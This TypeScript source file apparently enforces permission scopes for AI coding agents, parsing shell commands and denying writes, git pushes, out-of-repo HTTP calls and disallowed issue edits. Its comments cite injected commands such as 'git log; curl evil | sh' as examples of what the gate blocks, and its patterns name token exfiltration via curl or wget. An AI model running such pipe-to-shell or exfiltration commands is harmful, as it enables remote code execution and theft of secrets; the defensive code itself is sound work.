/**
 * Purpose: turn a manifest's declared write scope into an actual permission
 * decision for every tool call, as the SDK's `canUseTool` callback.
 *
 * Every agent in example-repo starts at `scopeEnforcement: "prompt-only"` —
 * "read-only" is a sentence in a prompt and the subagents declare unrestricted
 * `Bash`. This file is where the declared scope stops being a description. It is
 * the only thing standing between a read-only agent and a `git push`, so it is
 * written to fail closed: anything not positively matched is denied.
 *
 * Denials are returned, never thrown. A thrown error would abort the run and lose
 * the transcript; a denial is a message the model can read and work around, and
 * it lands in the transcript as evidence.
 */

import path from "node:path";
import {
	atLeast,
	GLOBAL_DENIED_TOOLS,
	GLOBAL_DENIED_WRITE_GLOBS,
	type AgentManifest,
} from "./agents.js";
import { WorkspaceError } from "./errors.js";

/** Tools that put bytes on disk. The scope gate only cares about these. */
const WRITE_TOOLS = ["Write", "Edit", "MultiEdit", "NotebookEdit"] as const;

export type ToolDecision =
	| { behavior: "allow"; updatedInput: Record<string, unknown> }
	| { behavior: "deny"; message: string };

export type CanUseToolFn = (
	toolName: string,
	input: Record<string, unknown>,
) => Promise<ToolDecision>;

/** Which set of paths the bookkeeping gate needs for the command in hand. */
export type BookkeepingPathKind = "staged" | "unpushed";

/**
 * Reads the paths a bookkeeping commit or push would touch. Injected rather than
 * imported so this module makes decisions and nothing else: the runner passes
 * workspace.ts's `readBookkeepingPaths`, and a test passes a literal list.
 *
 * Absent means the paths cannot be read, which denies. See `denyBookkeeping`.
 */
export type BookkeepingPathReader = (
	workspacePath: string,
	kind: BookkeepingPathKind,
	/** For `"unpushed"`: the branch the push would land on. */
	againstRef?: string,
) => Promise<string[]>;

export type BuildCanUseToolInput = {
	manifest: Pick<
		AgentManifest,
		"tools" | "writeScope" | "artifactGlobs" | "statePaths" | "mainBookkeeping"
	>;
	workspacePath: string;
	/** `tools:` frontmatter from the prompt file, when it has one. */
	declaredTools?: string[];
	/**
	 * The repo's default branch, so a push at it can be told from a push at a
	 * feature branch. Absent fails closed: an unknown default branch means every
	 * push is treated as if it could land on main.
	 */
	defaultBranch?: string;
	readBookkeepingPaths?: BookkeepingPathReader;
};

function isWriteTool(toolName: string): boolean {
	return (WRITE_TOOLS as readonly string[]).includes(toolName);
}

function escapeRegExp(value: string): string {
	return value.replace(/[.+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Minimal glob to RegExp. `**` crosses separators, `*` does not, everything else
 * is literal. Deliberately not a full glob implementation: the patterns come from
 * manifests we write, and a permissive matcher here is a privilege escalation.
 */
export function globToRegExp(glob: string): RegExp {
	let source = "";
	for (let index = 0; index < glob.length; index += 1) {
		const char = glob[index];
		if (char !== "*") {
			source += escapeRegExp(char ?? "");
			continue;
		}
		if (glob[index + 1] === "*") {
			index += 1;
			source += ".*";
			continue;
		}
		source += "[^/]*";
	}
	return new RegExp(`^${source}$`);
}

function matchesAnyGlob(candidate: string, globs: readonly string[]): string | undefined {
	for (const glob of globs) {
		if (globToRegExp(glob).test(candidate)) return glob;
	}
	return undefined;
}

/**
 * Glob for command lines rather than paths, where `*` crosses everything. A
 * path-style `*` would break the manifests we already have: `Bash(gh api*)` has
 * to match `gh api repos/o/r/pulls/1/comments`, slashes and all.
 */
export function commandGlobToRegExp(glob: string): RegExp {
	let source = "";
	for (const char of glob) {
		source += char === "*" ? ".*" : escapeRegExp(char);
	}
	return new RegExp(`^${source}$`, "s");
}

/** The string a `Tool(pattern)` allow-list entry is matched against. */
function toolMatchTarget(toolName: string, input: Record<string, unknown>): string {
	if (toolName === "Bash") {
		return typeof input["command"] === "string" ? input["command"] : "";
	}
	for (const key of ["file_path", "path", "notebook_path", "pattern", "url"]) {
		const value = input[key];
		if (typeof value === "string") return value;
	}
	return "";
}

/**
 * Does an allow-list entry cover this call? `"Read"` matches the tool by name;
 * `"Bash(git log*)"` matches only when the command also matches the inner glob.
 */
export function matchesToolPattern(
	pattern: string,
	toolName: string,
	input: Record<string, unknown>,
): boolean {
	const parenthesised = /^([^(]+)\((.*)\)$/.exec(pattern);
	if (parenthesised === null) return pattern.trim() === toolName;
	const patternToolName = (parenthesised[1] ?? "").trim();
	if (patternToolName !== toolName) return false;
	return commandGlobToRegExp(parenthesised[2] ?? "").test(toolMatchTarget(toolName, input));
}

/**
 * Narrow the manifest allow-list by the prompt file's own `tools:` line. Narrower
 * always wins, in both directions: a manifest pattern survives only if the file
 * declares its tool, and a tool the file declares but the manifest omits is
 * dropped.
 */
export function intersectToolPatterns(
	allowedTools: string[],
	declaredTools: string[] | undefined,
): string[] {
	if (declaredTools === undefined || declaredTools.length === 0) return [...allowedTools];
	const declaredNames = new Set(
		declaredTools.map((entry) => {
			const parenthesised = /^([^(]+)\(/.exec(entry);
			return (parenthesised?.[1] ?? entry).trim();
		}),
	);
	return allowedTools.filter((pattern) => {
		const parenthesised = /^([^(]+)\(/.exec(pattern);
		const toolName = (parenthesised?.[1] ?? pattern).trim();
		return declaredNames.has(toolName);
	});
}

/** The base tool name of an allow-list pattern: `Bash(git log*)` -> `Bash`. */
export function toolNameOfPattern(pattern: string): string {
	const parenthesised = /^([^(]+)\(/.exec(pattern);
	return (parenthesised?.[1] ?? pattern).trim();
}

/**
 * Resolve `candidate` inside `workspacePath` and return the absolute path.
 * Throws WorkspaceError when the result escapes the worktree; `buildCanUseTool`
 * catches that and turns it into a denial, because traversal is a decision to
 * report, not a crash.
 */
export function assertPathInside(workspacePath: string, candidate: string): string {
	const root = path.resolve(workspacePath);
	const resolved = path.resolve(root, candidate);
	const relative = path.relative(root, resolved);
	if (relative === "" || relative.startsWith("..") || path.isAbsolute(relative)) {
		throw new WorkspaceError(`path ${candidate} resolves outside the leased workspace`, {
			workspacePath: root,
			candidate,
		});
	}
	return resolved;
}

/** Workspace-relative, forward-slashed, so globs match the same on Windows. */
function relativePosixPath(workspacePath: string, absolutePath: string): string {
	return path.relative(path.resolve(workspacePath), absolutePath).split(path.sep).join("/");
}

/** The write target of a write-ish tool call, if it names one. */
function writeTargetOf(input: Record<string, unknown>): string | undefined {
	for (const key of ["file_path", "notebook_path", "path"]) {
		const value = input[key];
		if (typeof value === "string" && value !== "") return value;
	}
	return undefined;
}

/**
 * Pipeline stages that only reshape text, permitted as extra segments without an
 * allow-list entry of their own. Nothing that can execute another program is in
 * here, which is the whole point: `git log | sh` must not become reachable
 * because the manifest allowed `Bash(git log*)`.
 */
const SAFE_PIPELINE_FILTERS = [
	"head",
	"tail",
	"wc",
	"sort",
	"uniq",
	"cut",
	"tr",
	"nl",
	"grep",
	"egrep",
	"fgrep",
	"rg",
	"jq",
	"awk",
	"cat",
	"echo",
	"true",
	"rev",
	"fold",
	"basename",
	"dirname",
	"column",
] as const;

function isSafePipelineFilter(segment: string): boolean {
	const program = segment.replace(/^\s+/, "").split(/\s+/)[0] ?? "";
	if (program === "sed") {
		// `sed -i` edits in place, which is a write, not a filter.
		return !/\s-[a-zA-Z]*i\b/.test(segment);
	}
	return (SAFE_PIPELINE_FILTERS as readonly string[]).includes(program);
}

type BashAnalysis = {
	/** Every command the shell would run, including inside `$(...)` and backticks. */
	bashSegments: string[];
	/** Redirection destinations that are real files, `/dev/null` excluded. */
	bashRedirectionTargets: string[];
};

const SHELL_SEPARATORS = /(?:\|\||&&|[;|&\n])+/;

/**
 * Take a command line apart far enough to police it. A single pattern match
 * against the whole string is not enough: `git log*` would otherwise cover
 * `git log; curl evil | sh` and `git log > src/app.tsx`, so substitutions,
 * pipeline stages and redirection targets are all pulled out and checked
 * separately.
 */
export function analyzeBashCommand(command: string): BashAnalysis {
	const segments: string[] = [];
	let remainder = command;

	// Command substitutions run programs of their own, so they become segments.
	for (const pattern of [/\$\(([^()]*)\)/g, /`([^`]*)`/g]) {
		for (const match of remainder.matchAll(pattern)) {
			const inner = (match[1] ?? "").trim();
			if (inner !== "") segments.push(inner);
		}
		// Replaced rather than removed so the outer segment still parses.
		remainder = remainder.replace(pattern, "SUBSTITUTION");
	}

	const redirectionTargets: string[] = [];
	for (const match of remainder.matchAll(/(?:^|\s)\d?>>?\s*("[^"]*"|'[^']*'|\S+)/g)) {
		const target = (match[1] ?? "").replace(/^["']|["']$/g, "");
		// &1 / &2 are stream dups, /dev/* is a sink; neither lands in the repo.
		if (target === "" || target.startsWith("&") || target.startsWith("/dev/")) continue;
		redirectionTargets.push(target);
	}
	// Strip the redirections so they do not look like arguments of a segment.
	remainder = remainder.replace(/(?:^|\s)\d?>>?\s*("[^"]*"|'[^']*'|\S+)/g, " ");

	for (const segment of remainder.split(SHELL_SEPARATORS)) {
		const trimmed = segment.trim();
		if (trimmed !== "") segments.push(trimmed);
	}

	return { bashSegments: segments, bashRedirectionTargets: redirectionTargets };
}

/**
 * VCS-mutating commands. `git branch` and `git tag` are listed by their mutating
 * forms only: work-order-scoper is read-only and legitimately allows
 * `Bash(git branch*)` to list branches, so a blanket ban on the subcommand would
 * make a read-only agent unrunnable.
 */
function vcsMutationIn(segment: string): string | undefined {
	const normalised = segment.replace(/\s+/g, " ").trim();
	if (/^git\s+(commit|push|merge|rebase|cherry-pick|revert|am|apply|stash)\b/.test(normalised)) {
		return normalised.split(" ").slice(0, 2).join(" ");
	}
	if (/^git\s+(checkout|switch)\s+(-b|-B|-c|-C)\b/.test(normalised)) return "git checkout -b";
	if (/^git\s+reset\s+.*(--hard|--merge|--keep)\b/.test(normalised)) return "git reset --hard";
	if (
		/^git\s+branch\s+(-d|-D|-m|-M|-c|-C|--delete|--move|--copy|--set-upstream-to|--unset-upstream|--force)\b/.test(
			normalised,
		)
	) {
		return "git branch (mutating)";
	}
	// `git branch <name>` creates a branch; `git branch -a` only lists.
	if (/^git\s+branch\s+[^-]/.test(normalised)) return "git branch (create)";
	if (/^git\s+tag\s+(-a|-d|-f|-m|-s|--delete|--force)\b/.test(normalised)) {
		return "git tag (mutating)";
	}
	if (/^git\s+tag\s+[^-]/.test(normalised)) return "git tag (create)";
	if (/^gh\s+pr\s+create\b/.test(normalised)) return "gh pr create";
	return undefined;
}

/**
 * The `-m` / `--message` value of a `git commit`, best effort. Returning
 * `undefined` for a commit with no inline message is the point as much as parsing
 * the quoted forms is: a commit that would open an editor has no message to vet,
 * and the bookkeeping gate refuses what it cannot read.
 */
function commitMessageOf(segment: string): string | undefined {
	const matched = /(?:^|\s)(?:-m|--message)(?:=|\s+)("([^"]*)"|'([^']*)'|(\S+))/.exec(segment);
	if (matched === null) return undefined;
	return matched[2] ?? matched[3] ?? matched[4];
}

/**
 * True when a commit stages on its own: `-a`, `--all`, or an `a` inside a short
 * flag cluster like `-am`. These defeat the staged-diff check by construction —
 * the diff is read first and the staging happens afterwards — so the gate refuses
 * them instead of trying to predict what they would add.
 */
function commitStagesEverything(segment: string): boolean {
	const normalised = segment.replace(/\s+/g, " ").trim();
	if (/\s--all\b/.test(normalised)) return true;
	return /\s-[a-zA-Z]*a/.test(normalised);
}

/**
 * The branch a `git push` would land on, read from the destination side of the
 * refspec so `HEAD:refs/heads/main` is recognised as main. `undefined` means the
 * command names no refspec, which pushes the current branch — unknowable here,
 * and treated as if it could be main.
 */
function pushTargetOf(segment: string): string | undefined {
	const normalised = segment.replace(/\s+/g, " ").trim();
	if (!/^git\s+push\b/.test(normalised)) return undefined;
	const operands = normalised
		.split(" ")
		.slice(2)
		.filter((word) => !word.startsWith("-"));
	// [remote, refspec]: the refspec is the second operand when both are present.
	const refspec = operands[1];
	if (refspec === undefined) return undefined;
	const destination = refspec.includes(":") ? (refspec.split(":").pop() ?? "") : refspec;
	return destination.replace(/^refs\/heads\//, "");
}

/**
 * Push flags the bookkeeping grant never covers. A grant says "these paths may
 * land on main"; it does not say "history on main may be rewritten or deleted",
 * and `--force` and `--delete` are not describable as a set of paths at all.
 */
function unsafePushFlagIn(segment: string): string | undefined {
	const normalised = segment.replace(/\s+/g, " ").trim();
	const matched =
		/\s(--force-with-lease|--force|--delete|--mirror|--tags|--all|--prune|-f\b|-d\b)/.exec(
			normalised,
		);
	return matched?.[1];
}

/** Writes that leave the repo: PR comments, non-GET API calls, Jira, HTTP clients. */
function externalWriteIn(segment: string): string | undefined {
	const normalised = segment.replace(/\s+/g, " ").trim();
	if (/^gh\s+pr\s+(comment|review|close|reopen|merge|edit|ready)\b/.test(normalised)) {
		return normalised.split(" ").slice(0, 3).join(" ");
	}
	if (/^gh\s+(issue|release)\s+(create|comment|edit|close|delete)\b/.test(normalised)) {
		return normalised.split(" ").slice(0, 3).join(" ");
	}
	if (/^gh\s+api\b/.test(normalised)) {
		const method = /(?:-X|--method)\s+([A-Za-z]+)/.exec(normalised)?.[1];
		if (method !== undefined && method.toUpperCase() !== "GET") {
			return `gh api -X ${method.toUpperCase()}`;
		}
		// gh api infers POST from a field flag even with no explicit method.
		if (/\s(-f|-F|--field|--raw-field|--input)\b/.test(normalised))
			return "gh api (implicit POST)";
	}
	if (/^(jira|jira-cli|acli)\b/.test(normalised)) return normalised.split(" ")[0] ?? "jira";
	// Any HTTP client aimed off this machine. A GET is not harmless here: an
	// agent that has read a tracker token can send it anywhere with one. The
	// loopback exception is what lets a read-only audit ask a local server for
	// its health.
	if (/^(curl|wget)\b/.test(normalised)) {
		const urls = normalised.match(/\b(?:https?|ftp):\/\/[^\s"']+/g) ?? [];
		const loopbackOnly =
			urls.length > 0 &&
			urls.every((url) => /^\w+:\/\/(localhost|127\.0\.0\.1|\[::1\])(?:[:/]|$)/.test(url));
		if (!loopbackOnly) return normalised.split(" ")[0] ?? "curl";
	}
	return undefined;
}

/**
 * The flags `gh issue edit` may carry: moving an issue on the board, and nothing
 * that rewrites what a human wrote. A tracker binding needs labels and a
 * milestone; the title, body and assignees belong to whoever filed the issue.
 * Checked at every scope, because the allow-list cannot express it — a
 * `Bash(gh issue edit*)` pattern's wildcard admits `--title` as readily as
 * `--add-label`.
 */
const ISSUE_EDIT_BOARD_FLAGS = [
	"--repo",
	"-R",
	"--add-label",
	"--remove-label",
	"--milestone",
	"-m",
] as const;

function issueEditOverreachIn(segment: string): string | undefined {
	const normalised = segment.replace(/\s+/g, " ").trim();
	if (!/^gh\s+issue\s+edit\b/.test(normalised)) return undefined;
	// Quoted words are values, never flags, so a label called "-x" is not one.
	const words = normalised.match(/"[^"]*"|'[^']*'|\S+/g) ?? [];
	for (const word of words.slice(3)) {
		if (!word.startsWith("-")) continue;
		const flag = word.split("=")[0] ?? word;
		if (!(ISSUE_EDIT_BOARD_FLAGS as readonly string[]).includes(flag)) return flag;
	}
	return undefined;
}

/**
 * Build the `canUseTool` callback for one run. The returned function is the whole
 * enforcement surface. The runner passes the SDK no `allowedTools` of its own, so
 * every tool use reaches this callback rather than being pre-approved past it.
 */
export function buildCanUseTool(input: BuildCanUseToolInput): CanUseToolFn {
	const { manifest, workspacePath, declaredTools, defaultBranch, readBookkeepingPaths } = input;
	const scope = manifest.writeScope;
	// Rule 1: intersect once, at build time, so every decision uses one list.
	const effectiveAllowList = intersectToolPatterns(manifest.tools.allowedTools, declaredTools);
	const deniedPaths = manifest.tools.deniedPaths ?? [];
	const stateDirectories = manifest.statePaths.map((statePath) =>
		statePath.path.replace(/\/+$/, ""),
	);
	const bookkeeping = manifest.mainBookkeeping;

	/**
	 * Rules 3, 4 and 5 for one write target. Shared by the write-ish tools and by
	 * shell redirection, because `Write` and `git log > src/app.tsx` are the same
	 * act and must get the same answer.
	 */
	const denyWriteTarget = (label: string, target: string): ToolDecision | undefined => {
		// Rule 5, hoisted: a path outside the worktree cannot be glob-checked
		// against anything meaningful, so it is settled first.
		let absoluteTarget: string;
		try {
			absoluteTarget = assertPathInside(workspacePath, target);
		} catch {
			return {
				behavior: "deny",
				message: `${label} target ${target} resolves outside the leased workspace`,
			};
		}
		const relativeTarget = relativePosixPath(workspacePath, absoluteTarget);

		// Rule 3: global denials, then the manifest's own extra denials.
		const globallyDenied = matchesAnyGlob(relativeTarget, GLOBAL_DENIED_WRITE_GLOBS);
		if (globallyDenied !== undefined) {
			return {
				behavior: "deny",
				message: `${relativeTarget} is globally denied by "${globallyDenied}"; no agent may write it at any scope`,
			};
		}
		const manifestDenied = matchesAnyGlob(relativeTarget, deniedPaths);
		if (manifestDenied !== undefined) {
			return {
				behavior: "deny",
				message: `${relativeTarget} is denied by this agent's deniedPaths entry "${manifestDenied}"`,
			};
		}

		// Rule 4: the write-scope gate.
		if (scope === "read-only") {
			return {
				behavior: "deny",
				message: `${label} is not permitted: this agent is read-only`,
			};
		}
		if (scope === "artifacts") {
			const artifactGlob = matchesAnyGlob(relativeTarget, manifest.artifactGlobs);
			const insideState = stateDirectories.some(
				(directory) =>
					directory !== "" &&
					(relativeTarget === directory || relativeTarget.startsWith(`${directory}/`)),
			);
			if (artifactGlob === undefined && !insideState) {
				return {
					behavior: "deny",
					message: `${relativeTarget} is outside this agent's artifactGlobs (${manifest.artifactGlobs.join(", ") || "none"}) and its state paths; scope "artifacts" only permits writes there`,
				};
			}
		}
		return undefined;
	};

	/**
	 * The guarded-push helper the `MainBookkeeping` contract names. Returns a
	 * denial, or `undefined` when the grant genuinely covers this command.
	 *
	 * Three things have to hold, and all three are about making the grant mean
	 * what it says. Every path the command would touch is inside `paths`, so
	 * "may commit .week-plan/" cannot become "may commit src/". The message
	 * carries `[skip ci]`, because a bookkeeping commit on main that triggers a
	 * full pipeline is a cost the grant was not asked to authorise. And the paths
	 * are read, not assumed: if the reader is missing or git fails, the answer is
	 * no, since an unreadable diff and one full of product code look identical
	 * from here.
	 */
	const denyBookkeeping = async (
		mutation: string,
		segment: string,
		/** The branch a push would land on; unused for a commit. */
		againstRef: string | undefined,
	): Promise<ToolDecision | undefined> => {
		const deny = (reason: string): ToolDecision => ({
			behavior: "deny",
			message: `"${mutation}" is gated by this agent's mainBookkeeping grant: ${reason}`,
		});

		if (bookkeeping === undefined) {
			return {
				behavior: "deny",
				message: `"${mutation}" mutates VCS state, which scope ${scope} does not permit (needs branch-push or higher, or a mainBookkeeping grant)`,
			};
		}

		const isCommit = /^git\s+commit\b/.test(segment.trim());
		const isPush = /^git\s+push\b/.test(segment.trim());
		if (!isCommit && !isPush) {
			// The grant is a path allow-list for landing bookkeeping on the default
			// branch. Nothing else it could be stretched to cover — merge, rebase,
			// reset, branch creation — is describable as a set of paths.
			return deny(`the grant covers "git commit" and "git push" only, not "${mutation}"`);
		}

		if (isCommit) {
			if (commitStagesEverything(segment)) {
				return deny(
					"a commit that stages on its own (-a/--all) cannot be vetted, because the staged diff is read before the staging happens; stage the paths explicitly first",
				);
			}
			const message = commitMessageOf(segment);
			if (message === undefined) {
				return deny("the commit passes no -m, so it has no message to check for [skip ci]");
			}
			if (!message.includes("[skip ci]")) {
				return deny(
					`the commit message must carry [skip ci]; got ${JSON.stringify(message)}`,
				);
			}
		}

		if (isPush) {
			const unsafeFlag = unsafePushFlagIn(segment);
			if (unsafeFlag !== undefined) {
				return deny(
					`${unsafeFlag} is never covered by a grant, which authorises paths, not history rewrites or ref deletions`,
				);
			}
			if (againstRef === undefined) {
				return deny(
					"the branch it would land on cannot be determined, so the diff to authorise cannot be computed; name the refspec, as in `git push origin main`",
				);
			}
		}

		if (readBookkeepingPaths === undefined) {
			return deny(
				"no reader was wired up, so the paths it would touch cannot be read; this is a runner bug, not an agent one",
			);
		}

		let touched: string[];
		try {
			touched = await readBookkeepingPaths(
				workspacePath,
				isCommit ? "staged" : "unpushed",
				againstRef,
			);
		} catch (caught: unknown) {
			return deny(`the paths it would touch could not be read (${String(caught)})`);
		}

		if (touched.length === 0) {
			return deny(
				isCommit
					? "nothing is staged, so there is no diff to authorise"
					: "nothing is unpushed, so there is no diff to authorise",
			);
		}

		const outside = touched.filter(
			(target) => matchesAnyGlob(target, bookkeeping.paths) === undefined,
		);
		if (outside.length > 0) {
			return deny(
				`${outside.join(", ")} ${outside.length === 1 ? "is" : "are"} outside the granted paths (${bookkeeping.paths.join(", ")})`,
			);
		}

		return undefined;
	};

	const bashPatterns = effectiveAllowList.filter(
		(pattern) => toolNameOfPattern(pattern) === "Bash",
	);

	return async (toolName: string, toolInput: Record<string, unknown>): Promise<ToolDecision> => {
		// Rule 0: tools no manifest may grant. Ahead of the allow-list so the
		// message names the real problem: a PowerShell call matches no `Bash(...)`
		// pattern, and reporting that as a scope violation sends the reader looking
		// for a permissions bug instead of a shell mismatch.
		if ((GLOBAL_DENIED_TOOLS as readonly string[]).includes(toolName)) {
			return {
				behavior: "deny",
				message: `tool ${toolName} is denied for every agent at every scope; this repo's allow-lists are written in Bash, so run shell commands through Bash instead`,
			};
		}

		// Rule 2: the allow-list. Nothing gets past this point unmatched.
		const matched = effectiveAllowList.some((pattern) =>
			matchesToolPattern(pattern, toolName, toolInput),
		);
		if (!matched) {
			// "Not granted at all" and "granted, but not for this argument" are
			// different problems and used to share one message. The shared wording is
			// what makes a run debug its write scope when the real answer is that
			// `git log` is simply not on the list: naming the entries that do exist
			// turns a dead end into the next thing to try.
			const patternsForTool = effectiveAllowList.filter(
				(pattern) => toolNameOfPattern(pattern) === toolName,
			);
			if (patternsForTool.length === 0) {
				return {
					behavior: "deny",
					message: `tool ${toolName} is not in this agent's allow-list at all (scope ${scope})`,
				};
			}
			return {
				behavior: "deny",
				message: `${toolName} is allowed here but not for ${JSON.stringify(toolMatchTarget(toolName, toolInput))}; this agent's ${toolName} entries are: ${patternsForTool.join(", ")}`,
			};
		}

		if (isWriteTool(toolName)) {
			const target = writeTargetOf(toolInput);
			if (target === undefined) {
				return {
					behavior: "deny",
					message: `${toolName} did not name a file path, so it cannot be checked against scope ${scope}`,
				};
			}
			return (
				denyWriteTarget(toolName, target) ?? { behavior: "allow", updatedInput: toolInput }
			);
		}

		if (toolName === "Bash") {
			const command = typeof toolInput["command"] === "string" ? toolInput["command"] : "";
			const { bashSegments, bashRedirectionTargets } = analyzeBashCommand(command);

			for (const segment of bashSegments) {
				// The allow-list is re-applied per segment. Matching only the whole
				// string would let `Bash(git log*)` carry `git log; curl evil | sh`.
				if (
					!isSafePipelineFilter(segment) &&
					!bashPatterns.some((pattern) =>
						matchesToolPattern(pattern, "Bash", { command: segment }),
					)
				) {
					return {
						behavior: "deny",
						message: `bash segment "${segment}" is not covered by this agent's allow-list (${bashPatterns.join(", ") || "no Bash patterns"}); scope ${scope} requires every command in a pipeline to be permitted`,
					};
				}
				// Applied to every scope below branch-push, not just working-tree: a
				// read-only agent must not reach VCS mutation either.
				//
				// A push that lands on the default branch is checked at EVERY scope,
				// because that is the case the grant exists for. work-queue sits at
				// draft-pr or above, where the tier test is already satisfied, and still commits
				// .week-plan/ straight to main; gating only on the tier would leave its
				// grant advisory and main unprotected above branch-push.
				const mutation = vcsMutationIn(segment);
				if (mutation !== undefined) {
					const pushTarget = pushTargetOf(segment);
					const landsOnDefaultBranch =
						/^git\s+push\b/.test(segment.trim()) &&
						// Both unknowns fail closed: `git push` with no refspec pushes
						// the current branch, which may well be the default one.
						(pushTarget === undefined ||
							defaultBranch === undefined ||
							pushTarget === defaultBranch);
					if (landsOnDefaultBranch || !atLeast(scope, "branch-push")) {
						const decision = await denyBookkeeping(
							mutation,
							segment,
							pushTarget ?? defaultBranch,
						);
						if (decision !== undefined) return decision;
					}
				}
				const overreach = issueEditOverreachIn(segment);
				if (overreach !== undefined) {
					return {
						behavior: "deny",
						message: `"gh issue edit ${overreach}" changes more than an issue's place on the board; agents may only add or remove labels and set the milestone (${ISSUE_EDIT_BOARD_FLAGS.join(", ")})`,
					};
				}
				if (!atLeast(scope, "external-writes")) {
					const external = externalWriteIn(segment);
					if (external !== undefined) {
						return {
							behavior: "deny",
							message: `"${external}" writes outside the repo, which scope ${scope} does not permit (needs external-writes)`,
						};
					}
				}
			}

			for (const target of bashRedirectionTargets) {
				const decision = denyWriteTarget(`shell redirection to ${target}`, target);
				if (decision !== undefined) return decision;
			}
		}

		return { behavior: "allow", updatedInput: toolInput };
	};
}
